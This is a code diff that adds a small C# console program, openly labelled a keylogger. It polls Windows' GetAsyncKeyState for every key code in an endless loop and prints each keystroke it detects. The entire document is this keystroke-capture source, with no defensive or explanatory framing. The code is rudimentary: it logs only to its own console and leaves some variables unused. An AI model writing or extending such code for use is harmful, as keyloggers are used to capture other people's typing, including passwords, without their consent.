@@ -1,0 +1,36 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+
+class Program
+{
+    private static char[] input;
+    private static char unicode;
+
+    [DllImport("user32.dll")]
+    public static extern int GetAsyncKeyState(Int32 i);
+
+    static void Main(string[] args)
+    {
+        Console.WriteLine("KeyLogger is started");
+        while (true)
+        {
+            Thread.Sleep(250);
+            
+            for (int i = 0; i < 255; i++)
+            {
+                int keyState = GetAsyncKeyState(i);
+                if (keyState == 1 || keyState == -32767)
+                {           
+                   
+                    Console.WriteLine(i);
+                    char character = (char)i;
+                    string text = character.ToString();
+                    Console.WriteLine(character);
+                    break;
+                }
+            }
+            
+        }
+    }
+}
